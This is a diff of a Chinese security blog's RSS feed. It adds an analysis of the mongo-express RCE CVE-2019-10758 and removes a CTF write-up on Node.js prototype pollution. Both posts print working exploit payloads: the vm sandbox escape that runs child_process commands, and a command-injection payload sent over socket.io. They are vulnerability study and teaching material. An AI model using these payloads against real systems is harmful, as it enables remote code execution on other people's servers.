@@ -5,8 +5,235 @@
     <description>Recent content in syang&#39;s blog on syang&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Fri, 03 Jan 2020 18:26:07 +0800</lastBuildDate>
+    <lastBuildDate>Thu, 09 Jan 2020 20:29:44 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>CVE-2019-10758 mongo-express RCE 漏洞分析</title>
+      <link>https://syang-ng.github.io/2020/01/cve-2019-10758-mongo-express-rce/</link>
+      <pubDate>Thu, 09 Jan 2020 20:29:44 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2020/01/cve-2019-10758-mongo-express-rce/</guid>
+      <description>
+
+&lt;h2 id=&#34;起因&#34;&gt;起因&lt;/h2&gt;
+
+&lt;p&gt;看到 github 上 follow 的师傅们突然纷纷 star 了一个项目，仔细一看是 mongo-express 的 RCE，赶紧来学习一下最新姿势 2333（项目地址：&lt;a href=&#34;https://github.com/masahiro331/CVE-2019-10758）&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/masahiro331/CVE-2019-10758）&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;下面是对漏洞的描述：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;mongo-express before 0.54.0 is vulnerable to Remote Code Execution via endpoints that uses the &lt;code&gt;toBSON&lt;/code&gt; method. A misuse of the &lt;code&gt;vm&lt;/code&gt; dependency to perform &lt;code&gt;exec&lt;/code&gt; commands in a non-safe environment.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h2&gt;
+
+&lt;p&gt;漏洞复现需要准备的环境有：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;MongoDB&lt;/li&gt;
+&lt;li&gt;node &amp;amp; npm&lt;/li&gt;
+&lt;li&gt;mongo-express &amp;lt; 0.54.0&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;因此可采用如下命令准备环境：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;docker run -p 27017:27017 -d mongo
+npm install mongo-express@0.53.0 
+cd node_modules/mongo-express/ &amp;amp;&amp;amp; npm start
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-10758-mongo-express-RCE/mongo-express.png&#34; alt=&#34;mongo-express&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
+
+&lt;p&gt;首先看一下作者贴的两个 exploit：&lt;/p&gt;
+
+&lt;h2 id=&#34;curl-exploit&#34;&gt;cURL exploit&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;curl &#39;http://localhost:8081/checkValid&#39; -H &#39;Authorization: Basic YWRtaW46cGFzcw==&#39;  --data &#39;document=this.constructor.constructor(&amp;quot;return process&amp;quot;)().mainModule.require(&amp;quot;child_process&amp;quot;).execSync(&amp;quot;/Applications/Calculator.app/Contents/MacOS/Calculator&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;script-exploit&#34;&gt;Script exploit&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;node main.js
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;exploit = &amp;quot;this.constructor.constructor(\&amp;quot;return process\&amp;quot;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;)&amp;quot;
+
+var bson = require(&#39;mongo-express/lib/bson&#39;)
+bson.toBSON(exploit)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显从 exploit 中我们能明显得出以下两个结论：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;存在 RCE 漏洞的代码位于 &lt;code&gt;mongo-express/lib/bson&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;路由 &lt;code&gt;/checkValid&lt;/code&gt; 从外部接收输入，并调用了存在 RCE 漏洞的代码，由此存在被攻击的风险&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;首先定位可以接受外界输入的路由 &lt;a href=&#34;https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/router.js：&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/router.js：&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const router = function (config) {
+  // 省略其他无关代码
+  const appRouter = express.Router();
+  appRouter.post(&#39;/checkValid&#39;, mongoMiddleware, configuredRoutes.checkValid);
+  return appRouter;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;继续定位 &lt;a href=&#34;https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/routes/document.js：&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/routes/document.js：&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var routes = function (config) {
+  // 省略其他无关代码
+  var exp = {};
+  exp.checkValid = function (req, res) {
+    var doc = req.body.document;
+    try {
+      bson.toBSON(doc);
+    } catch (err) {
+      console.error(err);
+      return res.send(&#39;Invalid&#39;);
+    }
+
+    res.send(&#39;Valid&#39;);
+  };
+  return exp;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以很明显看到这里会从 POST 请求中读取 &lt;code&gt;document&lt;/code&gt; 并作为参数继续调用 &lt;code&gt;bson.toBSON(doc);&lt;/code&gt;，而根据我们之前的分析，漏洞代码有 99% 的可能性位于 &lt;code&gt;bson.toBSON&lt;/code&gt; 函数内，所以继续分析源码，&lt;a href=&#34;https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/bson.js：&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/bson.js：&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var mongodb = require(&#39;mongodb&#39;);
+var vm      = require(&#39;vm&#39;);
+var json    = require(&#39;./json&#39;);
+
+// 省略一些无关代码
+
+//JSON.parse doesn&#39;t support BSON data types
+//Document is evaluated in a vm in order to support BSON data types
+//Sandbox contains BSON data type functions from node-mongodb-native
+exports.toBSON = function (string) {
+  var sandbox = exports.getSandbox();
+
+  string = string.replace(/ISODate\(/g, &#39;new ISODate(&#39;);
+  string = string.replace(/Binary\((&amp;quot;[^&amp;quot;]+&amp;quot;),/g, &#39;Binary(new Buffer($1, &amp;quot;base64&amp;quot;),&#39;);
+
+  vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);
+
+  return sandbox.doc;
+};
+
+// This function as the name suggests attempts to parse
+// the free form string in to BSON, since the possibilities of failure
+// are higher, this function uses a try..catch
+exports.toSafeBSON = function (string) {
+  try {
+    var bsonObject = exports.toBSON(string);
+    return bsonObject;
+  } catch (err) {
+    return null;
+  }
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;重点出现！&amp;gt;&amp;gt;&amp;gt; &lt;code&gt;vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;对 nodejs 的沙箱逃逸有所关注的朋友很容易就能注意到这段代码和 vm 沙盒逃逸代码 demo 的惊人相似：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const vm = require(&#39;vm&#39;);
+
+vm.runInNewContext(&#39;this.constructor.constructor(&amp;quot;return process&amp;quot;)().exit()&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在这里，由于用户输入的最终会被拼接上 &lt;code&gt;eval&lt;/code&gt;，所以很容易就能导致 RCE。可以看到作者的 exploit 就是获得全局上下文后直接导入 &lt;code&gt;child_process&lt;/code&gt; 来执行系统命令：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;this.constructor.constructor(&amp;quot;return process&amp;quot;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-10758-mongo-express-RCE/success.png&#34; alt=&#34;成功RCE&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不过由于这是个没有回显的 RCE，因此在实际漏洞利用的时候可能需要反弹 shell 之类的操作来辅助漏洞的利用。&lt;/p&gt;
+
+&lt;h3 id=&#34;攻击链回顾&#34;&gt;攻击链回顾&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;路由 &lt;code&gt;/checkValid&lt;/code&gt; 可以接收用户的输入，并将其作为参数调用存在漏洞的 &lt;code&gt;bson.toBSON&lt;/code&gt; 函数&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;bson.toBSON&lt;/code&gt;  使用了不安全的 vm 模块来执行用户输入的代码&lt;/li&gt;
+&lt;li&gt;恶意代码在执行时成功沙盒逃逸，任意代码执行&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;漏洞修复&#34;&gt;漏洞修复&lt;/h2&gt;
+
+&lt;p&gt;查看修复了漏洞的 v0.54.0 版本的源代码，&lt;a href=&#34;https://github.com/mongo-express/mongo-express/blob/v0.54.0/lib/bson.js，&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/mongo-express/mongo-express/blob/v0.54.0/lib/bson.js，&lt;/a&gt; 可以看到作者废弃了之前 vm + eval 的思路，使用了另一个库来实现该功能：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const parser = require(&#39;mongodb-query-parser&#39;);
+// 省略无关代码
+exports.toBSON = function (string) {
+  return parser(string);
+};
+
+// This function as the name suggests attempts to parse
+// the free form string in to BSON, since the possibilities of failure
+// are higher, this function uses a try..catch
+exports.toSafeBSON = function (string) {
+  try {
+    var bsonObject = exports.toBSON(string);
+    return bsonObject;
+  } catch (err) {
+    return null;
+  }
+};
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;好吧，既然没有了 vm 那当然没有沙盒逃逸更没有 RCE 了 :(&lt;/p&gt;
+
+&lt;h2 id=&#34;补充-vm-沙盒逃逸&#34;&gt;补充：vm 沙盒逃逸&lt;/h2&gt;
+
+&lt;p&gt;写到这里再来补充点 vm 沙盒逃逸的知识，方便加深大家对该漏洞的理解：&lt;/p&gt;
+
+&lt;p&gt;以漏洞代码为例：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这段代码等价于：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const vm = require(&#39;vm&#39;);
+
+const script = new vm.Script(&#39;doc = eval((&#39; + string + &#39;));&#39;);
+const context = vm.createContext(sandbox);
+
+script.runInContext(context);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;对象 &lt;code&gt;sandbox&lt;/code&gt; 就是 vm 中脚本执行时的上下文环境 context，vm 脚本中全局 this 指向的就是该对象。&lt;/p&gt;
+
+&lt;p&gt;然后如果我们的输入是上文所示的 exploit 的话， vm 中的代码大致等价为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// this -&amp;gt; 传入的 sandbox
+const ObjectConstructor = this.constructor; // 获取 Object 对象构造函数
+const FunctionConstructor = ObjectConstructor.constructor; // 获取 Function 对象构造函数
+const myfun = FunctionConstructor(&#39;return process&#39;); // 构造一个函数，返回process全局变量
+const process = myfun(); // 获得全局 process 变量
+process.mainModule.require(&amp;quot;child_process&amp;quot;).execSync(&amp;quot;/Applications/Calculator.app/Contents/MacOS/Calculator&amp;quot;) // 全局变量简直为所欲为
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到 vm 模块不安全的核心问题在于：vm 内脚本的 context 对象是在主程序中定义的，根据 JS 原型链原理，可以轻松获得主程序中的 Function 对象。然后如果用主程序的 Function 对象构造一个函数，那么该函数运行时的上下文环境必然位于主程序中，由此获得了主程序的上下文环境，成功沙盒逃逸！&lt;/p&gt;
+
+&lt;h2 id=&#34;写在最后&#34;&gt;写在最后&lt;/h2&gt;
+
+&lt;p&gt;vm 的沙盒逃逸也是个老生常谈的话题了，没想到在 node-express 这种高达 3.5k stars 的项目中还会出现这种漏洞，只能说，开发人员还需要提高一下自己的安全意识（笑&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/masahiro331/CVE-2019-10758&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;github: CVE-2019-10758&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000012672620&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;vm2，安全的沙箱环境&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     
     <item>
       <title>Java及Android类加载机制学习笔记</title>
@@ -4114,267 +4341,6 @@ fetch(&#39;http://nodepad.hackable.software:3000/admin/flag&#39;).then((res) =&a
 &lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2831&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Teaser Dragon CTF 2018 Writeup by r3kapig&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.w3schools.com/tags/tag_base.asp&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;HTML &lt;base&gt; Tag&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#Tagged_template_literals&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;模板字符串&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>从一道 CTF 题看 Node.js 的 prototype pollution attack</title>
-      <link>https://syang-ng.github.io/2018/09/%E4%BB%8E%E4%B8%80%E9%81%93-ctf-%E9%A2%98%E7%9C%8B-nodejs-%E7%9A%84-prototype-pollution-attack/</link>
-      <pubDate>Tue, 25 Sep 2018 14:50:27 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2018/09/%E4%BB%8E%E4%B8%80%E9%81%93-ctf-%E9%A2%98%E7%9C%8B-nodejs-%E7%9A%84-prototype-pollution-attack/</guid>
-      <description>
-
-&lt;blockquote&gt;
-&lt;p&gt;文章首发于先知社区 &lt;a href=&#34;https://xz.aliyun.com/t/2802&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://xz.aliyun.com/t/2802&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
-
-&lt;p&gt;文章的灵感来自于刚刚结束的 DefCamp CTF 2018 上的一道题目，主要的考点是 Node.js 的 prototype pollution attack。因为在 CTF 中 Node.js 的题型较少，同时本人也恰好对其比较感兴趣，所以特地来分析一下这道题的前因后果。&lt;/p&gt;
-
-&lt;h2 id=&#34;题目&#34;&gt;题目&lt;/h2&gt;
-
-&lt;p&gt;题目是一个由 Node.js 编写的基于 socket.io 的聊天应用，运行在 &lt;a href=&#34;https://chat.dctfq18.def.camp&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://chat.dctfq18.def.camp&lt;/a&gt; 的 80 端口上，我们可以从 &lt;a href=&#34;https://dctf.def.camp/dctf-18-quals-81249812/chat.zip&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://dctf.def.camp/dctf-18-quals-81249812/chat.zip&lt;/a&gt; 下载源码&lt;/p&gt;
-
-&lt;p&gt;客户端的代码非常简单，分析 client.js 我们可以发现其只是向服务端注册用户并发送消息：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const io = require(&#39;socket.io-client&#39;)
-const socket = io.connect(&#39;https://chat.dctfq18.def.camp&#39;)
-
-if(process.argv.length != 4) {
-  console.log(&#39;name and channel missing&#39;)
-   process.exit()
-}
-console.log(&#39;Logging as &#39; + process.argv[2] + &#39; on &#39; + process.argv[3])
-var inputUser = {
-  name: process.argv[2],
-};
-
-socket.on(&#39;message&#39;, function(msg) {
-  console.log(msg.from,&amp;quot;[&amp;quot;, msg.channel!==undefined?msg.channel:&#39;Default&#39;,&amp;quot;]&amp;quot;, &amp;quot;says:\n&amp;quot;, msg.message);
-});
-
-socket.on(&#39;error&#39;, function (err) {
-  console.log(&#39;received socket error:&#39;)
-  console.log(err)
-})
-
-socket.emit(&#39;register&#39;, JSON.stringify(inputUser));
-socket.emit(&#39;message&#39;, JSON.stringify({ msg: &amp;quot;hello&amp;quot; }));
-socket.emit(&#39;join&#39;, process.argv[3]);//ps: you should keep your channels private
-socket.emit(&#39;message&#39;, JSON.stringify({ channel: process.argv[3], msg: &amp;quot;hello channel&amp;quot; }));
-socket.emit(&#39;message&#39;, JSON.stringify({ channel: &amp;quot;test&amp;quot;, msg: &amp;quot;i own you&amp;quot; }));
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;所以我们需要继续审计服务端的代码，可以看到 server.js 中存在着很一个敏感的函数 &lt;code&gt;getAscii&lt;/code&gt;，在分析了其对应的代码后，可以发现其中存在着一个很明显的命令注入问题：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;getAscii: function(message) {
-    var e = require(&#39;child_process&#39;);
-    return e.execSync(&amp;quot;cowsay &#39;&amp;quot; + message + &amp;quot;&#39;&amp;quot;).toString();
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;只要我们构造 &lt;code&gt;message = &amp;quot;aaa&#39;;ls -al; echo &#39;xxx&amp;quot;&lt;/code&gt;，服务器就会将命令 &lt;code&gt;cowsay &#39;aaa&#39;; ls -al; echo &#39;xxx&#39;&lt;/code&gt; 执行后的结果发送给我们。&lt;/p&gt;
-
-&lt;p&gt;那么我们需要关注的下一个问题则是哪里会调用 &lt;code&gt;getAscii&lt;/code&gt; 函数，可以发现服务端会在监听到 join 和 leave 两个事件的时候触发该函数：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;client.on(&#39;join&#39;, function(channel) {
-    try {
-        clientManager.joinChannel(client, channel);
-        sendMessageToClient(client,&amp;quot;Server&amp;quot;, 
-            &amp;quot;You joined channel&amp;quot;, channel)
-
-        var u = clientManager.getUsername(client);
-        var c = clientManager.getCountry(client);
-
-        sendMessageToChannel(channel,&amp;quot;Server&amp;quot;, 
-            helper.getAscii(&amp;quot;User &amp;quot; + u + &amp;quot; living in &amp;quot; + c + &amp;quot; joined channel&amp;quot;))
-    } catch(e) { console.log(e); client.disconnect() }
-});
-
-client.on(&#39;leave&#39;, function(channel) {
-    try {
-        client .join(channel);
-        clientManager.leaveChannel(client, channel);
-        sendMessageToClient(client,&amp;quot;Server&amp;quot;, 
-            &amp;quot;You left channel&amp;quot;, channel)
-
-        var u = clientManager.getUsername(client);
-        var c = clientManager.getCountry(client);
-        sendMessageToChannel(channel, &amp;quot;Server&amp;quot;, 
-            helper.getAscii(&amp;quot;User &amp;quot; + u + &amp;quot; living in &amp;quot; + c + &amp;quot; left channel&amp;quot;))
-    } catch(e) { console.log(e); client.disconnect() }
-});
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;所以下一个问题则变成了如何控制变量 &lt;code&gt;u&lt;/code&gt; 或 &lt;code&gt;c&lt;/code&gt;，即用户输入的 username 和 country，但问题是不是这么简单呢？当然不是，服务端会对用户的输入做非常严格的校验：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;validUser: function(inp) {
-    var block = [&amp;quot;source&amp;quot;,&amp;quot;port&amp;quot;,&amp;quot;font&amp;quot;,&amp;quot;country&amp;quot;,
-                    &amp;quot;location&amp;quot;,&amp;quot;status&amp;quot;,&amp;quot;lastname&amp;quot;];
-    if(typeof inp !== &#39;object&#39;) {
-        return false;
-    } 
-
-    var keys = Object.keys(inp);
-    for(var i = 0; i&amp;lt; keys.length; i++) {
-        key = keys[i];
-
-        if(block.indexOf(key) !== -1) {
-            return false;
-        }
-    }
-
-    var r =/^[a-z0-9]+$/gi;
-    if(inp.name === undefined || !r.test(inp.name)) {
-        return false;
-    }
-
-    return true;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到由于正则检查的存在，我们根本无法在 name 属性注入代码，而且由于黑名单的限制，我们也无法直接给 country 属性赋值，那么问题是不是已经陷入僵局了？答案是否定的，天无绝人之路，在这里，我们可以使用 prototype pollution attack 来间接复写 country 属性。&lt;/p&gt;
-
-&lt;p&gt;具体操作如下：
-1. 我们通过给对象的 &lt;code&gt;__proto__&lt;/code&gt; 属性赋值，构造出 &lt;code&gt;{&amp;quot;name&amp;quot;:&amp;quot;xxx&amp;quot;, &amp;quot;__proto__&amp;quot;:{&amp;quot;country&amp;quot;:&amp;quot;xxx&#39;;ls -al;echo &#39;xxx&amp;quot;}}&lt;/code&gt;
-2. 在服务端接收该对象并调用 &lt;code&gt;clone&lt;/code&gt; 函数后，攻击生效。此时访问对象的 country 属性，会得到我们注入的 &lt;code&gt;&amp;quot;xxx&#39;;ls -al;echo &#39;xxx&amp;quot;&lt;/code&gt;
-3. 服务端执行 &lt;code&gt;getAscii&lt;/code&gt; 函数，触发命令注入
-4. 继续改写 payload，成功 get flag&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925142325-824626bc-c08b-1.png&#34; alt=&#34;Get Flag&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;payload&#34;&gt;payload&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const io = require(&#39;socket.io-client&#39;)
-const socket = io.connect(&#39;https://chat.dctfq18.def.camp&#39;)
-
-socket.on(&#39;error&#39;, function (err) {
-  console.log(&#39;received socket error:&#39;)
-  console.log(err)
-})
-
-socket.on(&#39;message&#39;, function(msg) {
-  console.log(msg.from,&amp;quot;[&amp;quot;, msg.channel!==undefined?msg.channel:&#39;Default&#39;,&amp;quot;]&amp;quot;, &amp;quot;says:\n&amp;quot;, msg.message);
-});
-
-socket.emit(&#39;register&#39;, `{&amp;quot;name&amp;quot;:&amp;quot;xxx&amp;quot;, &amp;quot;__proto__&amp;quot;:{&amp;quot;country&amp;quot;:&amp;quot;xxx&#39;;ls -al;echo &#39;xxx&amp;quot;}}`);
-socket.emit(&#39;message&#39;, JSON.stringify({ msg: &amp;quot;hello&amp;quot; }));
-socket.emit(&#39;join&#39;, &#39;xxx&#39;);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;问题分析&#34;&gt;问题分析&lt;/h2&gt;
-
-&lt;p&gt;本题的解题思路就到此为止了，但题目背后的 prototype pollution attack 还是非常值得我们思考的。以上题为例，我们来分析一下为什么会触发该攻击。&lt;/p&gt;
-
-&lt;p&gt;可以看到上题中，在收到客户端的数据后，服务端会先调用 JSON.parse 解析用户输入，然后再调用 clone 函数： &lt;code&gt;newUser = helper.clone(JSON.parse(inUser))&lt;/code&gt;，而问题恰好出在 clone 函数上，我们可以编写代码来复现该操作：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function clone(obj) {
-    if (typeof obj !== &#39;object&#39; || obj === null) {
-        return obj;
-    }
-
-    var newObj;
-    var cloneDeep = false;
-
-    if (!Array.isArray(obj)) {
-        if (Buffer.isBuffer(obj)) {
-            newObj = new Buffer(obj);
-        } else if (obj instanceof Date) {
-            newObj = new Date(obj.getTime());
-        } else if (obj instanceof RegExp) {
-            newObj = new RegExp(obj);
-        } else {
-            var proto = Object.getPrototypeOf(obj);
-            if (proto &amp;amp;&amp;amp; proto.isImmutable) {
-                newObj = obj;
-            } else {
-                newObj = Object.create(proto);
-                cloneDeep = true;
-            }
-        }
-    } else {
-        newObj = [];
-        cloneDeep = true;
-    }
-
-    if (cloneDeep) {
-        var keys = Object.getOwnPropertyNames(obj);
-        for (var i = 0; i &amp;lt; keys.length; ++i) {
-            var key = keys[i];
-            var descriptor = Object.getOwnPropertyDescriptor(obj, key);
-            if (descriptor &amp;amp;&amp;amp; (descriptor.get || descriptor.set)) {
-                Object.defineProperty(newObj, key, descriptor);
-            } else {
-                newObj[key] = clone(obj[key]);
-            }
-        }
-    }
-    return newObj;
-}
-
-var payload = &#39;{&amp;quot;__proto__&amp;quot;:{&amp;quot;oops&amp;quot;:&amp;quot;It works !&amp;quot;}}&#39;;
-var oldObj = JSON.parse(payload);
-console.log(oldObj.oops);
-var newObj = clone(oldObj);
-console.log(newObj.oops);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;运行代码，可以发现在调用 clone 函数之前，我们尝试访问 oldObj 的 oops 属性，得到的结果是 undefined，该属性不存在；但在 clone 后得到的新对象 newObj 中，我们成功访问到了原本不存在的 oops 属性。运行结果如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ node test.js
-undefined
-It works !
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这说明了我们无法在 oldObj 的自有属性或原型链上找到 oops 属性，但可以在 newObj 上找到 oops 属性，那么必然在调用 clone 函数得到 newObj 的时候，newObj 的原型发生了修改，所以我们才能成功访问到 newObj 的 oops 属性。&lt;/p&gt;
-
-&lt;p&gt;追踪函数，可以定位到发生问题的操作在哪：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925142829-37bb2d62-c08c-1.png&#34; alt=&#34;Code&#34; title=&#34;Code&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;很明显，在调用 &lt;code&gt;Object.getOwnPropertyNames(obj);&lt;/code&gt; 后获得的键名中存在 &lt;code&gt;__proto__&lt;/code&gt;，因为在这里 &lt;code&gt;__proto__&lt;/code&gt; 属性是 obj 对象的一个普通的自有属性，所以可以被该函数所返回，而一般对象的 &lt;code&gt;__proto__&lt;/code&gt; 属性是不会被该函数所列举出来的。而之后的 &lt;code&gt;newObj[&#39;__proto__&#39;] = clone(obj[&#39;__proto__&#39;]);&lt;/code&gt; 的赋值操作使得 newObj 的原型发生了变化。&lt;/p&gt;
-
-&lt;p&gt;为了加深理解，我们可以继续看下图：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925142910-5003bc0e-c08c-1.png&#34; alt=&#34;prototype&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;我们声明了三个 Object，分别是由 JSON.parse 生成的 oldObj，对 oldObj 调用 clone 函数生成的 newObj，以及通过对象字面量直接构造的 oriObj。&lt;/p&gt;
-
-&lt;p&gt;通过对三个对象分别调用 &lt;code&gt;xxx.hasOwnProperty(&#39;__proto__&#39;)&lt;/code&gt; 函数，我们可以发现只有 oldObj 在调用该函数时返回了 true；而在调用 &lt;code&gt;Object.getPrototypeOf(xxx)&lt;/code&gt; 后，只有 newObj 和 oriObj 返回的是 &lt;code&gt;Object {oops: &amp;quot;It works !&amp;quot;}&lt;/code&gt;，oldObj 返回的是 &lt;code&gt;Object {constructor: , __defineGetter__: , __defineSetter__: , hasOwnProperty: , __lookupGetter__: , …}&lt;/code&gt;。这说明 oldObj 的 &lt;code&gt;__proto__&lt;/code&gt; 属性与其余二者不同，并非是指向原型的属性，而是一个普通的自有属性，与其余的自有属性并没有什么区别，只是恰好名字较为敏感。&lt;/p&gt;
-
-&lt;p&gt;这就解释了上面的现象，为什么在 JSON.parse 后得到的对象不存在 prototype pollution 的问题，因为此时其所具有的 &lt;code&gt;__proto__&lt;/code&gt; 属性仅仅是一个普通的自有属性，对象在查找属性时会在真正的原型上进行查找，但在执行 clone 函数的过程中，由于该属性名字的特殊性，触发了新对象的原型的修改，最终导致了 prototype pollution。&lt;/p&gt;
-
-&lt;p&gt;对 js 如何查找对象属性感兴趣的同学可以继续参考下图：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925144510-8c7aa826-c08e-1.png&#34; alt=&#34;attribute found&#34; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
-
-&lt;p&gt;至此，我们再来梳理一下 prototype pollution attack 触发的流程：&lt;/p&gt;
-
-&lt;ol&gt;
